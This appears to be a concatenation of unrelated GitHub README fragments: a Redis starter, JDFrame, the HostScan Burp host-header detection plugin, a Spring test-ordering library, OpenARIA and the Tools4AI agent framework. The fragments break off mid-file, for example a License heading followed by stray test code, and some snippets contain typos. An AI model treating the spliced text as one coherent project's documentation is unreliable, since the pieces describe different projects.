We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

## License

    @Test
    public void testMyProvider() {
        final Optional<MyCacheTemplate> templateOptional = myProvider.getTemplate(""ds1"");

        if (templateOptional.isPresent()) {
            final MyCacheTemplate cacheTemplate = templateOptional.get();

            // Custom Methods
            cacheTemplate.test();

        }
    }

}
```

#### CacheDatasource custom redisson configuration

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. For example, custom setting the encoding of redisson serialization and deserialization while enabling the new CacheDatasource.

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<CacheTemplate> cacheDatasource() {
        return new DefaultCacheDatasource(){
            @Override
            public Consumer<CacheKeeperConfig> configPostProcessor(Consumer<CacheKeeperConfig> consumer) {
                return v -> v.getConfig().setCodec(new JsonJacksonCodec());
            }
        };
    }

}
```

# 简介

`JDFrame`是一个仿SQL数据处理工具， 一个流式处理工具， 一个JVM层级的仿DataFrame模型工具，提供了DataFrame模型的若干基本功能比如复杂数据筛选、分组聚合、窗口函数、连接矩阵。除此之外，还会语意化和简化一些Java8的stream流式处理功能，提供更加强大的流式处理能力。



<h1>特性</h1>

- **无侵入**：  非常轻量级无需任何依赖和配置环境， 使用它就像使用一个Util那么简单
- **DataFrame模型**:    JVM层级的仿DataFrame模型实现，涵盖了模型的大部分常用功能。同时，支持强类型，既不会导致数据类型的丢失，也无需进行硬编码操作。
- **类SQL的语义**： 如果您会 SQL 语言，基本上不需要花费什么学习精力。多数 API 基本都是依据 SQL 的语义来进行 Java 的实现，具有极高的可读性
- **强大的流式处理能力:**     在原有 Java8 的 stream 流的基础之上，提供了更为强大且更为简洁的流式处理能力。就理念而言，它并非是对 stream 的替换，而是对 stream 的继承
- **极简式API:**     把业务功能或者冗长繁杂的数据处理功能凝聚成一个极简且语意明晰的 API，以供开发者使用

hy0jer/HostScan,main,"## 前言

该BP插件是在工作之余编写出来的，设计初衷是实现对host头攻击的全自动检测，这是作者第一次尝试编写bp插件，可以说是个Demo项目，如果有任何使用问题或者其他好的idea，可提交issues 

## 简介

该插件支持对host头攻击的全自动检测和主动扫描

#注意该BP插件使用MontoyaApi编写，不兼容旧版burp suite

## 安装流程

在burp suite的Extensions选项页面添加HostScan插件

![install](./images/install.png)

正常安装完毕后是如下页面显示

![install1](./images/install1.png)

![install2](./images/show.png)

### 使用说明

该插件支持两种运行方式，手动选择进行扫描以及自动扫描

### 自动扫描

安装后该插件初始状态默认设置自动扫描，即经过burp suite的流量都会进行扫描，如果检测到存在host头攻击会在Target选项页面以及HostScan插件详情页面显示具体情况，如下图所示

![78170bb6529f16e2d29c42e764c5142](./images/78170bb6529f16e2d29c42e764c5142.png)

![a5fff58bf98e935270f22d19e2dce85](./images/a5fff58bf98e935270f22d19e2dce85.png)



如果不想使用自动扫描，可点击该框关闭，如下所示

![operate](./images/operate.png)

![show](./images/install2.png)

### 主动扫描

右键选择需要检测的请求包通过extensions选项进行扫描

![ceaab9b923e2758cb57e885d6d1b500](./images/ceaab9b923e2758cb57e885d6d1b500.png)

如果检测出安全问题，会在详情页面显示

seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

# Welcome to OpenARIA

This repository contains an open-source edition of the _Aviation Risk Identification and Assessment_ (ARIA) software
program developed by MITRE on behalf of the Federal Aviation Administration's (FAA) Safety and Technical Training (AJI)
Service Unit.

## OpenARIA's Goal

Our goal is to build a community focused on improving aviation safety & efficiency by extracting value from aircraft
location data.

## How OpenARIA can achieve this Goal

1. Provide a publicly available solution for **detecting aviation risks** within aircraft location data.
    - This tangible working solution can be critiqued by the community and improved as necessary.


2. Provide a publicly available solution for detecting **and then aggregating** aviation risks for bulk
   analysis.
    - Someone operating `OpenARIA` for a day will have one day's worth of output
    - Someone operating `OpenARIA` for a year will have a year's worth of output.
    - We must facilitate capturing and utilizing large amounts of output data.


3. Provide a publicly available solution for **archiving and replaying** aircraft location data
    - E.g., when `OpenARIA` detects _an event_, we will want to be able to replay the event to understand what happened.


4. Provide solutions that work with near-real time data streams as well as archival data.

# Getting Started

- Learn about important ongoing work [here](./docs/ADRs/supportingNewFormats.md)
  and [here](./docs/ADRs/pointInterfaceCritique2.md)
- Learn about the supported data formats [here](./docs/csv-data-format.md)
    - **Important Caveat:** The initial code commit includes a dependency that is not available in the open source
      domain.
    - We are working to remove this blocker by:
        1. Proposing [this](./docs/csv-data-format.md) data format (which will replace the legacy format)
        2. Adding support for this new data format
        3. Refactoring the code so the closed-source dependency is no longer used or required.
        4. Building the project using **only** GitHub Actions and publicly available dependencies
    - You can view the progress of this work by browsing the branches of the project.
- To begin **detecting aviation events** see [here](./docs/how-to/detect-encounters.md)
- To begin **archiving and replaying** aircraft location data see [here](./docs/how-to/replay-encounters.md)
- To begin detecting **and then aggregating** aviation data see [here](./docs/how-to/aggregate-encounters.md)_

## Building from Source

1. First clone the project: `git clone git@github.com:mitre-public/open-aria.git`
2. Navigate to project directory `cd {PATH_TO_REPOSITORY}/open-aria`
3. Run: `./gradlew shadowJar`
    - This command launches a build plugin that collects all compiled code and dependencies into a single
      jar (aka _uber jar_, _shadow jar_, or _fat jar_)
4. Find the _uber jar_ in: 
    - `{PATH_TO_REPOSITORY}/open-aria/open-aria-deploy/libs/build`
    - The _uber jar_ will have a name like: `open-aria-0.1.0-SNAPSHOT-uber.jar`

## Downloading Pre-Built Artifact
There are 2 places to simply download a pre-built artifact
1. Download a full release from [here](https://github.com/mitre-public/open-aria/releases)
   - **Coming soon** (ETA = June 1st)
2. Download the artifact produced during a recent execution of the CI/CD system.
   - Click [here](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml) to see the list of recent builds

# 💡 Tools4AI
Tools4AI is 100% Java based Agentic Framework which can be used to build Java based AI agents for integration with enterprise 
Java applications.
This project illustrates the integration of AI with enterprise tools or external tools, converting natural language prompts
into <span style=""font-size: larger;"">**actiona ble behaviors**.</span> These prompts can be called <span style=""font-size: larger;"">**""action prompts""**</span>
or <span style=""font-size: larger;"">**""actionable prompts""**</span>  By leveraging AI capabilities, it streamlines user interactions
with complex systems, enhancing productivity and innovation across diverse applications.<br>

For example , we can integrate AI with a customer service application. Users can interact with the AI system by asking<br> 
questions or making requests in natural language. For example, a user might ask,**""Schedule a maintenance <br>
appointment for my car.""** The AI system interprets the request, extracts relevant information such as the <br>
service required and preferred date, and then triggers the appropriate action in the customer service<br>
application to schedule the appointment. This seamless integration streamlines the process for users and<br>
enhances the efficiency of the customer service workflow.

| Schedule a <span style=""color:blue"">**video conference**</span> with the engineering team for next Monday at 10 AM.                                      | The AI system interfaces with the calendar and scheduling tool, creates a new event titled ""Engineering Team Video Conference"" for the specified date and time, and sends out meeting invitations to all members of the engineering team. |
| Submit a reimbursement request for the <span style=""color:blue"">**business**</span> trip <span style=""color:blue"">**expenses.**</span>                                                     | The AI system guides the user through the reimbursement request process, collecting necessary details such as expense receipts, dates, amounts, and purpose of expenditure. Once compiled, the system submits the reimbursement request to the appropriate department for processing. |



Prompt prediction is a technique used to anticipate user actions based on their input prompts. For instance,
if a user's prompt is ""my car broke down,"" in addition to the action ""bookTaxi,"" the AI system can predict a
set of subsequent actions such as ""bookCarService"" and ""orderFood"" (if it's dinner time). This predictive
capability enhances the user experience by proactively suggesting relevant actions or services based on the
context provided in the prompt.

## Java Actions

Fastest way to create action is by writing a java class  and  annotate its method with ```@Action```
annotation.

**Java Actions:** These are Java classes that have methods with ```@Action``` annotation . They are designed to 
perform specific actions based on prompts processed through Tools4AI.  

**@Predict Annotation:** This is a <u>class level</U> annotation. This annotation is used to add the action to the prediciton list, doing this will make sure
the action is called automatically when the prompt is processed and if the prompt matches with the action (action name or method name). All the methods 
in this class annotated with @Action will be added to the prediction list.

**@Action Annotation:** This is a <u>method level</u> annotation. The action method within the Java class is annotated with @Action to specify the action's behaviour
this is the actual method which will be triggered if the prompt matches by AI. You can have as many methods as you want with @Action
annotation in the class.

**Method Execution:** When a prompt like ""My friend's name is Vishal, I don’t know what to cook for him today."" 
is processed, the ```whatFoodDoesThisPersonLike``` method is automatically called with ""Vishal"" as the argument, 
and it returns ""Paneer Butter Masala"" as Vishal's preference. 
``` 
@Predict
public class SimpleAction  {

    @Action( description = ""what is the food preference of this person"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
This class can contain any number of methods both public or private. All the methods with ```@Action``` annotation  
in this class are going be added to the prediction list. In this case it is just ```whatFoodDoesThisPersonLike```.

This method can contain any number of parameters (Objects, Pojos, Arrays etc) and can be of have any return value, everythign will 
be mapped at runtime using prompt. ```@Action``` annotation also takes additional values for ActionRisk and Description.

When you send a prompt to  action processor (OpenAIActionProcessor, GeminiActionProcessor or AnthoripicActionProcessor)
``` 
 String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String functionResponse = (String)tra.processSingleAction(cookPromptSingleText);
 //functionResponse will be Paneer Butter Masala
 String aiResponse = tra.query(cookPromptSingleText,functionResponse);
 //aiResponse will be well forumulated response something like ""Hey looks like your friend likes Panner Butter Masala
```

The above action will be called with ``` name = Vishal``` automatically based on the action name and prompt type.
AI will figure out that this is the correct action to call. You can also add grouping information in Predict annotation to 
make it even more targeted. You don't have to specify the Action explicitly if its not a High Risk action

**Convert prompt to Pojo**

You can convert any Prompt into a Java Pojo object. Your pojo can be simple or complex , it can have arrays, list
maps and other pojos and they all will be mapped based on the prompt

```
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptText = ""Mhahrukh Khan works for MovieHits inc and his salary is $ 100  he joined Toronto on 
Labor day, his tasks are acting and dancing. He also works out of Montreal and Bombay. Krithik roshan is 
another employee of same company based in Chennai his taks are jumping and Gym he joined on Indian Independce
 Day"";
Organization org = (Organization) tra.transformIntoPojo(promptText, Organization.class.getName(),"""","""");
Assertions.assertTrue(org.getEm().get(0).getName().contains(""Mhahrukh""));
Assertions.assertTrue(org.getEm().get(1).getName().contains(""Krithik""));
```
The above code will map the prompt and convert into [Organization](src/test/java/com/t4a/examples/pojo/Organization.java) Pojo object 

**Trigger Action**

Trigger action based on prompt, in case its MyDiary action [MyDiaryAction](src/test/java/com/t4a/examples/actions/MyDiaryAction.java)

```
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""I have dentist appointment on 3rd July, then i have Gym appointment on 7th August 
 and I am meeting famous Bollywood actor Shahrukh Khan on 19 Sep. My friends Rahul, Dhawal, Aravind are 
 coming with me. My employee Jhonny Napper is comign with me he joined on Indian Independce day.
 My customer name is Sumitabh Bacchan he wants to learn acting form me he joined on labor day"";
 MyDiaryAction action = new MyDiaryAction();
 MyDiary dict = (MyDiary) tra.processSingleAction(promptText,action);
 log.info(dict.toString()); 
```

If you do not specify any action then it will be predicted based on prompt and groups for example

```
MyDiary dict = (MyDiary) tra.processSingleAction(promptText)
```
As you can notice we are not passing any action with the prompt the AI will figure out the action correctly

A simple Java action can be written like this 

```
@Predict(groupName = ""buildMyDiary"" , groupDescription = ""This is my diary details"")
public class MyDiaryAction implements JavaMethodAction {
    @Action  
    public MyDiary buildMyDiary(MyDiary diary) {
        //take whatever action you want to take
        return diary;
    }
} 
```
Here the actionName is ```buildMyDiary```, MyDiary pojo will be created automatically based on prompt

**Action groups**

```
@Predict(groupName = ""personal"", groupDescription = ""all personal actions are here"") 
```
Actions have to be annontated with @Predict to be added to prediction list , they can be grouped together with
the groupName.

**Custom Pojo**

There are different annontations which be used for special Pojo mapping

**Mapping list**

```
    @ListType(Employee.class)
    List<Employee> em;
    @ListType(String.class)
    List<String> locations; 
```

**Mapping Maps in objects**
``` 
@Predict(actionName = ""addSports"",description = ""add new Sports into the map"")
public class MapAction implements JavaMethodAction {

    public Map<Integer,String> addSports(@MapKeyType(Integer.class)  @MapValueType(String.class) Map<Integer,String> mapOfSportsName) {

        return mapOfSportsName;
    }
}

```

**Special Instructions**

``` 
@Prompt(describe = ""convert this to Hindi"")
private String reasonForCalling;
```

The above instruction will fetch the reason for calling from the user prompt and convert it into Hindi and put
it inside the ```reasonForCalling``` String

**Ignore Field**
```
    @Prompt(ignore = true)
    private String location;
```
If you do not want to populate a field you can annotate it as ignore

**Format Date**

```
    @Prompt(dateFormat = ""yyyy-MM-dd"" ,describe = ""if you dont find date provide todays date in fieldValue"")
    private Date dateJoined;
```
The above will fetch the dateJoined from the prompt and convert it into the format. So if your prompt is
""Book my dinner reservation on Indian Independence day"" , the dateJoined will be 2024-08-15

**Muliple Special Prompts**
```
 public class MyTranslatePojo {
    @Prompt(describe = ""translate to Hindi"")
    String answerInHindi;
    @Prompt(describe = ""translate to Punjabi"")
    String answerInPunJabi;

    @Prompt(describe = ""translate to Tamil"")
    String answerInTamil;
}
```
The above Pojo can be used to translate the prompt in multiple language and populate the result in variables

``` 
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptTxt = ""paneer is so good"";
MyTranslatePojo myp = (MyTranslatePojo)tra.transformIntoPojo(promptTxt,MyTranslatePojo.class.getName());
System.out.println(myp);
```

Result will look something like this 

``` MyTranslatePojo(answerInHindi=पनीर इतना अच्छा है, answerInPunJabi=ਪਨੀਰ ਬਹੁਤ ਵਧੀਆ ਹੈ, answerInTamil=பனீர் எப்படி நல்லது) ```

**High Risk Actions**  
There might be some actions which you do not want to be triggered automatically but passed explicitly in the processor
such actions can be annotated with HighRisk

```
@Predict(actionName = ""restartTheECOMServer"",description = ""will be used to restart the server"" , 
riskLevel = ActionRisk.HIGH, groupName = ""customer support"", 
groupDescription = ""actions related to customer support"")
public class ServerRestartAction implements JavaMethodAction {
    public String restartTheECOMServer(String reasonForRestart, String requestedBy) {
        return "" Server has been restarted by ""+requestedBy+"" due to following reason ""+reasonForRestart;
    }
}

```
The above action is marked as High Risk action so if you try to call it with simple prompt

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
String functionResponse = (String)processor.processSingleAction(""restartPrompt"");

```
It will not be triggered even though the AI will correct identify which action to trigger still it will get blocked.

You will have to call it explicitly this way

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
ServerRestartAction restartAction = new ServerRestartAction();
String functionResponse = (String)processor.processSingleAction(""restartPrompt"", restartAction);
```


## HTTP Actions (Swagger)

Any application exposing HTTP REST API can be converted into actions for example here is my sample [swagger_actions.json.](https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub/blob/main/swagger_actions.json)
All the REST calls such as get, post, put, delete will be mapped to actions and based on the prompts they can be triggered
automatically

``` 
{
  ""endpoints"" : [
    {
      ""swaggerurl"": ""https://fakerestapi.azurewebsites.net/swagger/v1/swagger.json"",
      ""group"": ""Books Author Activity"",
      ""description"": ""This is for all the actions related books , Authors, photos and users trying to read books and view photos"",
      ""baseurl"": ""https://fakerestapi.azurewebsites.net/"",
      ""id"": ""fakerestapi""
    },
    {
      ""swaggerurl"": ""https://petstore3.swagger.io/api/v3/openapi.json"",
      ""baseurl"": ""https://petstore3.swagger.io/"",
      ""group"": ""Petstore API"",
      ""description"": ""This is for all the actions related to pets"",
      ""id"": ""petstore""
    } ,
    {
      ""swaggerurl"": ""https://vishalmysore-instaservice.hf.space/v3/api-docs"",
      ""baseurl"": ""https://vishalmysore-instaservice.hf.space/"",
      ""group"": ""Enterprise Support and Tickeing System"",
      ""description"": ""This action is to create tickets track bugs across the enterprise"",
      ""id"": ""InstaService""
    }      
  ]
}
```

Books related api are put in a group called Books Author Activity group, similarly Petstore API is group for all the rest calls exposed by Petstore app 
if you provide a prompt ""create a ticket for me with number 1 and issue is compture not working"" 
it will automatically create a ticket on InstaService you can view the logs here https://huggingface.co/spaces/VishalMysore/InstaService?logs=container

```
@Test
public void testHttpActionOpenAI() throws AIProcessingException, IOException {
  OpenAiActionProcessor processor = new OpenAiActionProcessor();
  String postABook = ""post a book harry poster with id 189 the publish date is 2024-03-22 and the description 
  is about harry who likes poster its around 500 pages  "";
  String result = (String)processor.processSingleAction(postABook);
  Assertions.assertNotNull(result);
  String success = TestHelperOpenAI.getInstance().sendMessage(""Look at this message - ""+result+"" -
   was it a success? - Reply in true or false only"");
  log.debug(success);
  Assertions.assertTrue(""True"".equalsIgnoreCase(success));

} 
```
This will automatically trigger HTTP post call with correct parameters 

Read the complete link on how this has been deployed [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc/?trackingId=iZoQDW3%2BTH6j0%2FkbEMUxFw%3D%3D)


## Shell Actions 

Any kind of script can be coverted into Action for function calling by configuring the script in [shell_actions.yml](src/test/resources/shell_actions.yaml)
```
groups:
  - name: Employee Actions
    description : This is actions for all the new employees
    scripts:
      - scriptName: ""test_script.cmd""
        actionName: saveEmployeeInformation
        parameters: employeeName,employeeLocation
        description: This is a command which will save employee information
		
```

Here we are creating a group called Employee Actions and adding an action called ``` saveEmployeeInformation``` into the group. The parameters it takes are ```employeeName ``` and ```employeeLocation ```
Calling and actionprocessor with these kinds of prompt will trigger this Action
``` 
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""A new employee joined today in Toronto. Her name is Madhuri Khanna""; 
 tra.processSingleAction(promptText);
 
```
		
As You can notice we are not passing the action explicitly , it will be predicted by the AI at runtime and triggered.


## Custom HTTP Actions

If you do not have swagger URL and would like to configure HTTP rest end points it can be done via Custom HTTP Actions by configuring them in [http_actions.json](src/test/resources/http_actions.json)


``` 
{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
    {
      ""actionName"": ""somethingNotVeryUseful"",
      ""url"": ""https://api.example.com/temperature"",
      ""description"" : "" this will get real time temperature from the weather api"",
      ""type"": ""GET"",
      ""input_object"":[
        {
          ""name"": ""locationId"",
          ""type"": ""query_parameter"",
          ""description"": ""Location ID""
      }
      ],
      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""Real-time temperature data""
      },
      ""auth_interface"": {
        ""type"": ""API Key"",
        ""description"": ""API key required""
      }
    }
  ]
}

```
## Image Actions
Tools4AI uses Gemini (gemini-1.0-pro-vision) to enhance AI capabilities by enabling the system to analyze images
and automatically execute relevant actions based on the visual data it processes. This development is 
particularly crucial in emergency management, where speed and accuracy of response can save lives and property.

Reference code is [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java)

Detailed article on the same is avaiable [here](https://medium.com/@visrow/image-recognition-and-function-calling-with-gemini-and-java-e28b0356d3de)
```  
package org.example.image;

import com.t4a.processor.AIProcessingException;
import com.t4a.processor.GeminiImageActionProcessor;
import com.t4a.processor.GeminiV2ActionProcessor;

public class ImageActionExample {
    public static void main(String[] args) throws AIProcessingException {
        GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
        String imageDisription = processor.imageToText(args[0]);
        GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
        Object obj = actionProcessor.processSingleAction(imageDisription);
        String str  = actionProcessor.summarize(imageDisription+obj.toString());
        System.out.println(str);
    }
}
```
 <img src=""accident.png""  width=""300"" height=""300"">

If you execute the [ImageActionExample](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java) 
with above image as source it correctly identifies that we need to call Ambulance 

``` 
The image depicts a car accident involving a blue car and a red car on a city street. The blue car has front-end damage while the red car has rear-end damage. Debris from the accident is scattered on the street and a 
police officer is present at the scene. An ambulance has been called and is seen in the background.
```

Direct Action from Visual Cues: Whether it's a surveillance image of a car accident or a live feed of a residential fire, Tools4AI can immediately recognize critical situations and initiate appropriate emergency protocols without human input.
A sample action is written and the code is available [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/action/EmergencyAction.java)
``` 
@Predict(actionName = ""callEmergencyServices"", description = ""This action will be called in case of emergency"", groupName = ""emergency"")
public class EmergencyAction implements JavaMethodAction {
    public String callEmergencyServices(@Prompt(describe = ""Ambulance, Fire or Police"") String typeOfEmergency) {
        return typeOfEmergency+"" has been called"";
    }
} 
```
## Automated UI Validations

Images can also be converted into Json and Pojos for UI based validations. You can use selenium with Tools4AI 
to validated your UI instead of using elements from the web page , more details [here](https://medium.com/@visrow/selenium-and-ai-ui-validations-with-ai-1799ab2f305e)  

 <img src=""auto.PNG""  width=""300"" height=""300"">

The above image can be converted into a Pojo object with help of Tools4AI

```  
WebDriverManager.chromedriver().setup();

ChromeOptions options = new ChromeOptions();
options.addArguments(""--headless"");  // Setting headless mode
ptions.addArguments(""--disable-gpu"");  // GPU hardware acceleration isn't useful in headless mode
options.addArguments(""--window-size=1920,1080"");  // Set the window size
WebDriver driver = new ChromeDriver(options);

driver.get(""https://google.com"");
// Your code to interact with the page and take screenshots
// Take screenshot and save it as file or use as bytes
TakesScreenshot ts = (TakesScreenshot) driver;
byte[] screenshotBytes = ts.getScreenshotAs(OutputType.BYTES);
GeminiImageActionProcessor imageActionProcessor = new GeminiImageActionProcessor();
imageActionProcessor.imageToText(screenshotBytes)
//File srcFile = ts.getScreenshotAs(OutputType.FILE);
//File destFile = new File(""screenshot.png"");
//FileHandler.copy(srcFile, destFile);
driver.quit();
```

The pojo it will convert to is 

``` 
import lombok.*;
@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class AutoRepairScreen {
    double fullInspectionValue;
    double tireRotationValue;
    double oilChangeValue;
    Integer phoneNumber;
    String email;
    String[] customerReviews;
}
```

Integrating Tools4AI with Selenium offers a revolutionary approach to UI validation, streamlining the testing 
process by validating UI elements in their entirety. Rather than the traditional method of scrutinizing each 
element individually, this integration enables comprehensive, automated verification of tags and elements.
It simplifies the UI Validation workflow, ensuring accuracy and efficiency in confirming the UI's adherence to design specifications  

## Selenium integration
Tools4AI's integration with Selenium introduces a flexible way to automate UI testing. Instead of traditional
Java code for Selenium scripts, Tools4AI allows you to define test scenarios in plain English, offering a more 
accessible approach to testing web applications. These English-based commands can be converted into Selenium 
code to automate web-based interactions and streamline testing.  

**Example of Selenium Test with Tools4AI**
``` 
 WebDriver driver = new ChromeDriver(options);
 SeleniumProcessor processor = new SeleniumProcessor(driver);
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
